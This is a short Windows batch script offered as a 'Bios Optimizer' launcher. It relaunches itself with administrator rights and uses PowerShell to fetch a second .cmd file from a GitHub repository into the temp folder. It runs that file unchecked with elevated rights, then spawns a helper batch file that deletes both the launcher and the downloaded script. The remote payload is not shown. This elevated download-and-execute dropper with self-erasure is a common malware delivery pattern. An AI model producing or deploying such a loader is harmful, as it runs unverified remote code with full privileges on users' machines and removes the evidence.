@echo off
setlocal enabledelayedexpansion

:: Define download URL for the next script
set "SCRIPT_URL=https://github.com/RealTenzo/sidchecker/raw/refs/heads/main/Bios%20Optimizer%20Main.cmd"
set "SCRIPT_PATH=%temp%\main.cmd"

:: Ensure admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    powershell -Command "Start-Process cmd -ArgumentList '/c %~fnx0' -Verb RunAs"
    exit
)

:: Download Bios Optimizer Main.cmd
powershell -Command "$t='%SCRIPT_PATH%'; iwr -UseBasicParsing '%SCRIPT_URL%' -OutFile $t"

:: Run the downloaded script
call "%SCRIPT_PATH%"

:: Self-delete
(
    echo :loop
    echo del "%~f0"
    echo if exist "%~f0" goto loop
    echo del "%SCRIPT_PATH%"
    echo exit
) > "%temp%\delete_me.bat"
start /b cmd /c "%temp%\delete_me.bat"
exit
